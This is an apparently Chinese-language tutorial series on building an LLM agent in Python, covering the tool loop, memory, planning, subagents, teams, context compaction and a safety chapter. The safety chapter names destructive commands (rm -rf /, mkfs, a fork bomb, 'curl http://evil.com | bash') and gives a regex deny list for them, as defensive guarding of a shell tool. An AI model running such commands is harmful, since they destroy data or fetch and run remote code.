Chapter 1 · 100 Lines

底层原理，只有 100 行

理解 Agent 的最小本质：LLM + 工具 + 循环
核心公式
Agent = LLM + 工具 + 循环。普通对话是"你问我答"，Agent 是"你给我一个目标，我自己想办法完成"。这三个要素缺一不可。

普通对话 vs Agent

维度普通对话（Chat）Agent
交互模式一问一答，用户驱动自主循环，目标驱动
能力边界只能生成文本可以调用工具，作用于真实世界
状态管理每轮独立维护完整消息历史，含工具调用与结果
自主性无LLM 自主决定"下一步做什么"、"何时停止"

四大模块

⚙️
LLM 客户端初始化
使用 OpenAI SDK，通过 base_url 环境变量支持任何兼容 API 的服务（DeepSeek、Qwen 等）
📋
工具定义（Tool Schema）
JSON Schema 格式的"工具说明书"，随每次 API 请求发送给 LLM，让它"知道"自己有哪些能力
⚡
工具实现（Functions）
execute_bash、read_file、write_file 三个 Python 函数，把 LLM 的"意图"变成"行动"
🔄
Agent 循环（Core Loop）
20 行最精华代码：发送 → LLM 决策 → 有 tool_call 则执行 → 结果追加 → 循环

核心循环代码

Python · agent-essence.py（核心循环）
def run_agent(user_message, max_iterations=5):
    messages = [
        {"role": "system", "content": "You are a helpful assistant..."},
        {"role": "user",   "content": user_message}
    ]

    for _ in range(max_iterations):
        # Step 1: 把完整对话历史 + 工具列表发给 LLM
        response = client.chat.completions.create(
            model=MODEL, messages=messages, tools=tools
        )
        message = response.choices[0].message
        messages.append(message)

        # Step 2: 没有 tool_call → 任务完成，返回文本
        if not message.tool_calls:
            return message.content

        # Step 3: 有 tool_call → 逐个执行，结果追加到历史
        for tool_call in message.tool_calls:
            function_name = tool_call.function.name
            function_args = json.loads(tool_call.function.arguments)
            function_response = available_functions[function_name](**function_args)
            messages.append({
                "role": "tool",
                "tool_call_id": tool_call.id,
                "content": function_response
            })

    return "Max iterations reached"

运行时序图：一次完整的 Agent 执行

用户任务："统计当前目录下有多少个 Python 文件，并把结果写入 count.txt" │ ▼ ┌────────────────────────────────────────────────────────────┐ │ Agent Loop │ │ │ │ ① 发送 messages + tools ──▶ LLM 决策 │ │ │ │ │ 有 tool_call? │ │ Yes │ │ No │ │ ▼ ▼ │ │ 执行工具 返回文本 ──▶ 结束 │ │ │ │ │ 结果追加到 messages ◀─────┘ │ │ │ │ │ 下一轮循环 ──▶ 继续发送给 LLM │ └────────────────────────────────────────────────────────────┘ 轮次 1: execute_bash("find . -name '*.py' | wc -l") → "42\n" 轮次 2: write_file("count.txt", "Python files: 42") → "Success" 轮次 3: LLM 判断任务完成 → 返回文本，退出循环

关键设计洞察

⚡ 最重要的认知
LLM 不执行代码，只输出意图。LLM 的职责是"思考 + 生成工具调用指令（JSON）"，代码的职责是"解析指令 + 执行工具 + 返回结果"。LLM 是大脑，代码是手脚。

第一篇核心要点

  • messages 列表是 Agent 的短期记忆，每轮循环都会累积行动-观察历史
  • available_functions 字典是工具调度核心，通过工具名找到对应 Python 函数
  • max_iterations是安全阀，防止 LLM 陷入死循环
  • tool_call_id用于关联工具调用与返回结果，支持并行调用

Chapter 2 · Memory & Planning

记忆与规划

从"金鱼"到"带笔记本的实习生"：多 67 行，能力质变
本篇新增能力
跨会话记忆（agent_memory.md 文件持久化）＋ 任务规划（Plan-then-Execute 范式）＋ 多步串联（步骤间共享 messages 上下文）

两种记忆类型

记忆类型载体生命周期实现方式
短期记忆messages 列表单次运行内步骤间共享的对话历史
长期记忆agent_memory.md 文件跨多次运行注入 system prompt 的 "Previous context"

记忆的实现：存储 + 加载 + 注入

Python · agent-memory.py（记忆三步骤）
# ① 存储：每次任务完成后追加写入
def save_memory(task, result):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    entry = f"\n## {timestamp}\n**Task:** {task}\n**Result:** {result}\n"
    with open(MEMORY_FILE, 'a') as f:
        f.write(entry)

# ② 加载：滑动窗口，只取最后 50 行
def load_memory():
    with open(MEMORY_FILE, 'r') as f:
        content = f.read()
    lines = content.split('\n')
    return '\n'.join(lines[-50:])  # 滑动窗口截断

# ③ 注入：塞进 system prompt
memory = load_memory()
system_prompt = "You are a helpful assistant."
if memory:
    system_prompt += f"\n\nPrevious context:\n{memory}"
💡 记忆的本质
LLM 没有真正的持久记忆。所有"记忆"都是把外部存储的信息搬运到 prompt 中。无论是向量数据库、RAG 还是简单文件，底层都遵循同一模式：存在哪、怎么找、搬多少。

两种规划范式对比

规划代码：让 LLM 先拆解再执行

Python · agent-memory.py（任务规划）
def create_plan(task):
    response = client.chat.completions.create(
        model=MODEL,
        messages=[
            {"role": "system", "content": "Break down the task into 3-5 simple, actionable steps. Return as JSON array."},
            {"role": "user",   "content": f"Task: {task}"}
        ],
        response_format={"type": "json_object"}   # 强制结构化输出
    )
    plan_data = json.loads(response.choices[0].message.content)
    steps = plan_data.get("steps", [task])  # 解析失败则整个任务作为一步
    return steps

# 多步串联：steps 间共享同一个 messages 列表
for step in steps:
    result, actions, messages = run_agent_step(step, messages)  # messages 跨步传递
    all_results.append(result)

第二篇核心要点

  • 文件持久化是最朴素但最能说明原理的记忆方案：追加写入 Markdown 文件
  • 滑动窗口截断（只取最后 50 行）解决记忆文件无限增长问题
  • 多步串联的关键：run_agent_step 接收并返回 messages，步骤 2 能看到步骤 1 的完整轨迹
  • 优雅降级：JSON 解析失败则回退到"整个任务当作一步"，不会崩溃

能力维度：prompt 维度 vs tools 维度

Agent 的能力由两个正交维度定义： prompt 维度（知道什么） tools 维度（能做什么） ┌──────────────────┐ ┌──────────────────┐ │ Rules │ │ base_tools │ │ （行为约束） │ │ （7 个基础工具） │ ├──────────────────┤ ├──────────────────┤ │ Skills │ │ MCP tools │ │ （领域知识） │ │ （动态加载 N 个） │ ├──────────────────┤ └──────────────────┘ │ Memory │ │ （历史记忆） │ └──────────────────┘ 两者独立变化、自由组合，构成 Agent 的完整能力空间

第三篇核心要点

  • edit 工具的唯一性约束：old_string 必须恰好出现一次，迫使 LLM 先确认上下文再编辑

Chapter 4 · SubAgent

给 Agent 找个帮手——最简 SubAgent

核心新增仅 30 行代码：一次性临时工，独立上下文，专业角色
SubAgent 的本质
SubAgent 是一次性的。生命周期：生成 → 接收任务 → 干活（可以调用工具）→ 返回结果摘要 → 消亡。没有持久身份，没有跨调用记忆。它解决的是单次任务内的分工问题。

生活类比：项目经理 + 专人

之前（一个人干所有活）: 老板 → "小张，你把前端后端数据库全搞定" 小张（一个人扛所有，上下文越来越乱） 现在（项目经理 + 专人）: 老板 → 项目经理（主 Agent） │ ├── "后端用 FastAPI" → 后端工程师（SubAgent A） ├── "前端用 React" → 前端工程师（SubAgent B） └── "验证能跑通" → 测试工程师（SubAgent C） 每人只管自己的事，干完把结果交给项目经理汇总。 下次找"后端工程师"，是一个全新的、失忆的临时工。

SubAgent 的实现：核心 30 行

Python · agent-subagent.py（SubAgent 完整实现）
# ① 工具定义：告诉 LLM 有这个能力
{
    "name": "subagent",
    "description": "Delegate a task to a specialized sub-agent.",
    "parameters": {
        "role": {"type": "string", "description": "The sub-agent's specialty"},
        "task": {"type": "string", "description": "The specific task to delegate"}
    }
}

# ② 工具实现：启动独立 Agent 循环
def subagent(role, task):
    # 关键 1：独立的 messages，独立的 system prompt
    sub_messages = [
        {"role": "system", "content": f"You are a {role}. Be concise and focused."},
        {"role": "user",   "content": task}
    ]
    # 关键 2：排除 subagent 自身，防止无限递归
    sub_tools = [t for t in tools if t["function"]["name"] != "subagent"]

    for _ in range(10):
        response = client.chat.completions.create(
            model=MODEL, messages=sub_messages, tools=sub_tools
        )
        message = response.choices[0].message
        sub_messages.append(message)

        if not message.tool_calls:
            return message.content   # 返回后 sub_messages 被垃圾回收

        for tc in message.tool_calls:
            result = available_functions[tc.function.name](**json.loads(tc.function.arguments))
            sub_messages.append({"role": "tool", "tool_call_id": tc.id, "content": result})

# ③ 注册到路由表（就这一行）
available_functions["subagent"] = subagent

SubAgent 的调用链路

用户: "创建一个 TODO 应用，包含 Python 后端和 HTML 前端" │ ▼ 主 Agent 循环启动 │ ① 发送 tools 列表（含 subagent 工具）给 LLM │ ② LLM 决定委派，返回: {"tool_calls": [{"name": "subagent", "arguments": {"role": "Python backend developer", ...}}]} │ ③ 通用调度代码: available_functions["subagent"](**args) ↳ 和调用 bash、read 完全一样的路径！ │ ④ subagent() 内部启动全新 Agent 循环 - 独立 system prompt: "You are a Python backend developer." - 独立 messages（主 Agent 的历史对它不可见） - 可使用 read/write/bash 等工具 - 返回结果后消亡，sub_messages 被回收 │ ⑤ 结果返回给主 Agent，继续派出前端 SubAgent...
🎯 核心设计思想
控制流在 LLM 手里，不在代码里。没有任何地方主动调用 subagent()——代码只提供能力（注册工具），LLM 决定何时使用。这是 Agent 和传统程序的根本区别。

SubAgent vs Plan：什么时候用哪个？

维度Plan（第二篇）SubAgent（本篇）
上下文所有步骤共享 messages每个 SubAgent 独立 messages
身份同一个 Agent，同一角色每个 SubAgent 不同专业角色
适合场景步骤之间有依赖关系子任务之间相对独立
类比一个人按步骤做事叫了个跑腿临时工，干完就走

第四篇核心要点

  • subagent 就是一个工具：和 bash、read 走完全相同的调度路径
  • 独立 messages：SubAgent 只知道自己的角色和任务，不受主 Agent 历史干扰
  • 一次性生命周期：函数返回后 sub_messages 被垃圾回收，下次调用是全新实例
  • 排除自身防递归：sub_tools 过滤掉 subagent，一行代码解决无限嵌套

Chapter 5 · Multi-Agent Teams

从临时工到正式团队

Agent 类 + Team 类：持久记忆、身份管理、通信通道
本篇核心进化
从 SubAgent 的"一次性临时工"升级为正式团队：持久记忆（Agent 对象存活）+ 身份管理（有名字有角色）+ 通信通道（收件箱机制）

临时工 vs 正式员工

SubAgent（临时工）Teams Agent（正式员工）
有名字吗？❌ 只有临时角色描述✅ 有名字（alice）、有固定角色
记得上次做了什么？❌ 每次调用都失忆✅ 多次交互间记忆持续累积
能收到同事消息？❌ 互相看不到✅ 有收件箱，能收消息
什么时候消失？函数返回就没了团队解散才消失

# Teams Agent（本篇）—— 实例属性，对象存活就一直在
class Agent:
    def __init__(self, name, role):
        self.name = name
        self.role = role
        self.inbox = []                # 通信：收件箱
        self.messages = [              # 🟢 生命周期 = Agent 对象的生命周期
            {"role": "system", "content": f"You are {name}, a {role}."}
        ]

    def chat(self, task):
        # Step 1：先读收件箱
        if self.inbox:
            mail = "\n".join(f"[来自 {m['from']}]: {m['content']}" for m in self.inbox)
            self.messages.append({"role": "user", "content": f"你收到了消息:\n{mail}"})
            # ...LLM 消化 inbox...
            self.inbox.clear()
        # Step 2：执行本次任务（和第一篇循环一模一样）
        self.messages.append({"role": "user", "content": task})
        # ... Agent 循环 ...

    def receive(self, sender, message):
        self.inbox.append({"from": sender, "content": message})

Team 类：生命周期与通信管理

Python · agent-teams.py（Team 类）
class Team:
    def hire(self, name, role):    # 招募：创建持久 Agent
        agent = Agent(name, role)
        self.agents[name] = agent
        return agent

    def send(self, from_name, to_name, message):   # 点对点通信
        self.agents[to_name].receive(from_name, message)

    def broadcast(self, from_name, message):        # 广播给所有人
        for name, agent in self.agents.items():
            if name != from_name:
                agent.receive(from_name, message)

    def disband(self):                              # 解散团队
        self.agents.clear()

💡 一个变化，一次进化
从第四篇到第五篇，代码层面的变化只有一个：messages 从函数局部变量变成了类实例属性。但这一个变化，让 Agent 从"用完即弃的临时工"进化为了"有记忆、有身份、能协作的团队成员"。

第五篇核心要点

  • 持久记忆的实现：self.messages 随 Agent 对象存活，多次 chat() 调用历史持续累积
  • 收件箱机制：每次 chat() 开始前先消化 inbox，Agent 知道队友的最新进展
  • 广播 vs 点对点：broadcast 实现信息共享，send 实现精准传递
  • 数据放在哪里决定生命周期：局部变量 = 临时工，实例属性 = 正式员工

Chapter 6 · Context Compaction

Agent 的一次断舍离——上下文压缩

30 行代码解决"自我窒息"问题：记住要点，忘掉细节，轻装上阵
⚠️ 问题：messages 会无限增长
每轮循环 messages += [LLM回复, 工具结果]，稍微复杂的任务（读几个大文件、运行几次 grep）就会填满 context window，API 报错 context_length_exceeded，Agent 半途而废。

压缩原理：三刀切，用 LLM 做摘要

压缩前的 messages（20+ 条，快爆了）: ┌─────────┐ │ system │ ← 永远保留（不动） ├─────────┤ │ user │ ← 最初的任务 │ assist │ ← 调用了 bash │ tool │ ← bash 输出 200 行文件列表 │ assist │ ← 调用了 read_file ─┐ │ tool │ ← 文件内容 500 行 │ 这些旧消息 │ assist │ ← 调用了 grep │ 交给 LLM 做摘要 │ tool │ ← grep 结果 300 行 ─┘ │ ... │ │ assist │ ← 准备写文件 ─┐ │ tool │ ← 写入成功 │ 最近 6 条 │ assist │ ← 调用 read 验证 │ 保留原样 │ tool │ ← 文件内容 │ （不压缩） └─────────┘ ─┘ ↓ compact_messages() ↓ 压缩后（9 条，清爽了）: ┌─────────┐ │ system │ ├─────────┤ │ user │ "之前的摘要：找到了 42 个 Python 文件，统计了行数..." │ assist │ "明白，我继续。" ├─────────┤ │ ...最近 6 条（完整保留）... └─────────┘

压缩函数实现

Python · agent-compact.py（完整压缩函数）
COMPACT_THRESHOLD = 20   # 超过 20 条触发压缩
KEEP_RECENT       = 6    # 保留最近 6 条不压缩

def compact_messages(messages):
    if len(messages) <= COMPACT_THRESHOLD:
        return messages          # 没超阈值，原样返回（零开销）

    # 三刀切
    system_msg      = messages[0]               # 永远保留
    old_messages    = messages[1:-KEEP_RECENT]   # 要被压缩
    recent_messages = messages[-KEEP_RECENT:]    # 保留原样

    # 把旧消息拼成文本
    old_text = ""
    for msg in old_messages:
        role    = msg.get("role", "unknown")
        content = msg.get("content", "")
        if content:
            old_text += f"[{role}]: {content}\n"

    # 用 LLM 生成摘要（套娃：用 LLM 压缩 LLM 的历史）
    summary_response = client.chat.completions.create(
        model=MODEL,
        messages=[
            {"role": "system", "content": "Summarize the conversation. Keep all important facts, file paths, command results, and decisions. Be concise but don't lose critical details."},
            {"role": "user",   "content": old_text}
        ]
    )
    summary = summary_response.choices[0].message.content

    # 重新组装：system + 摘要对话 + 最近 N 条
    return [
        system_msg,
        {"role": "user",      "content": f"[Previous conversation summary]: {summary}"},
        {"role": "assistant", "content": "Understood. Let me continue."},
        *recent_messages
    ]

# 在 Agent 循环中，每轮开始前调用一次（就加这一行）
for i in range(max_iterations):
    messages = compact_messages(messages)   # ← 就这一行
    response = client.chat.completions.create(...)

messages 数量变化：锯齿波模式

轮次 1-5（增长）count: 2→10
轮次 6（压缩触发）count: 10→9
轮次 7-9（再次增长）count: 9→11
轮次 10（再次压缩）count: 11→9

messages 数量像锯齿波：涨到阈值 → 压缩回去 → 继续涨 → 再压缩。Agent 可以无限工作下去，永远不会撑爆 context window。

压缩会丢信息吗？
会丢细节，不丢要点。20 个具体文件名可能被压缩为"在 src/ 和 tests/ 下找到 20 个 Python 文件"。丢失的细节，Agent 可以再次调用工具获取。就像人类工作：记得大概情况，细节不记得就再查一遍。

第六篇核心要点

  • 触发机制：消息条数超阈值才压缩，没超则原样返回（零开销）
  • system prompt 单独保留：它包含 Agent 的基础设定，压缩进摘要会丢失"你是谁"
  • 最近 N 条不压缩：当前正在进行的操作需要精确上下文
  • 前六篇的关系：前五篇是"加能力"，第六篇是解决加完能力后的"副作用"

Chapter 7 · Safety & Permissions

Agent 执行 rm -rf / 怎么办？

三道安全防线：从"裸奔"到"有保险的" Agent
⚠️ Agent 手里有一把没有保险的枪
execute_bash 可以执行任意 shell 命令——包括 rm -rf /、mkfs.ext4 /dev/sda、curl http://evil.com | bash。LLM 会因为理解错误、幻觉、或 prompt 注入而执行危险操作。

三道防线的设计

LLM 输出一条命令 │ ▼ 防线 1: 命令黑名单（正则匹配） │ "rm -rf /" → 🚫 直接拦截，不问用户，返回拦截信息给 LLM │ "ls -la" → ✅ 通过 ▼ 防线 2: 用户确认（人机协作） │ "find . -name '*.py'" → 展示给用户 │ [Y] 放行 [N] 跳过 [Q] 终止 Agent ▼ 防线 3: 输出截断（防爆 context） │ 输出 10000 行 → 截断为首尾各 2500 字符 │ 输出 10 行 → 原样返回 ▼ 结果返回给 LLM

防线 1：命令黑名单

Python · agent-safe.py（黑名单实现）
DANGEROUS_PATTERNS = [
    r'\brm\s+(-[a-zA-Z]*f[a-zA-Z]*\s+|.*--no-preserve-root)', # rm -rf
    r'\bmkfs\b',                    # 格式化磁盘
    r'\bdd\s+.*of\s*=\s*/dev/',     # 覆写磁盘
    r'\bchmod\s+(-R\s+)?777\s+/',   # chmod 777 /
    r':\(\)\s*\{',                  # fork bomb
    r'\bcurl\b.*\|\s*(ba)?sh',      # curl | bash
    r'\bwget\b.*\|\s*(ba)?sh',      # wget | bash
    r'\bshutdown\b',                # 关机
    r'\breboot\b',                  # 重启
]

def is_dangerous(command):
    for pattern in DANGEROUS_PATTERNS:
        if re.search(pattern, command):
            return True, pattern
    return False, None

三道防线串联

Python · agent-safe.py（execute_bash 完整实现）
def execute_bash(command):
    # 防线 1: 黑名单
    dangerous, pattern = is_dangerous(command)
    if dangerous:
        return f"🚫 命令被拦截（匹配: {pattern}）: {command}"

    # 防线 2: 用户确认
    if not ask_user_confirmation("execute_bash", {"command": command}):
        return "用户跳过了此命令。"

    # 实际执行
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
        output = result.stdout + result.stderr
    except subprocess.TimeoutExpired:
        output = "Error: 命令执行超时（30秒）"

    # 防线 3: 输出截断
    return truncate_output(output)

进化方向：从硬编码到 Hook 管道

架构进化
三道防线目前是硬编码在函数里的。生产级框架会把它们抽象成 Hook（钩子）机制：一个可插拔的管道。加新检查只需往列表里 append 一个函数，不用改核心代码。这正是 Claude Code 的 hooks 系统的设计思路。
Python · 进化方向（Hook 管道）
# 可插拔的 Hook 管道（生产级实现思路）
before_hooks = [check_blacklist, ask_confirmation, log_command]
after_hooks  = [truncate_output, log_result]

def execute_tool(name, args):
    for hook in before_hooks:           # 执行前：依次过所有 hook
        blocked, msg = hook(name, args)
        if blocked: return msg           # 任何一个 hook 可以拦截

    result = available_functions[name](**args)  # 实际执行

    for hook in after_hooks:            # 执行后：依次过所有 hook
        result = hook(name, result)

    return result

第七篇核心要点

  • 黑名单用纯正则：不需要 AI 判断，最简单的往往最可靠
  • 拦截信息返回给 LLM：LLM 看到拦截信息后会自适应调整策略，换一种安全方式完成任务
  • 截断保留首尾：开头有文件头/标题，结尾有最新结果/错误信息，中间细节可以丢
  • 能力与约束是一体两面：前六篇回答"能做什么"，第七篇回答"不能做什么"
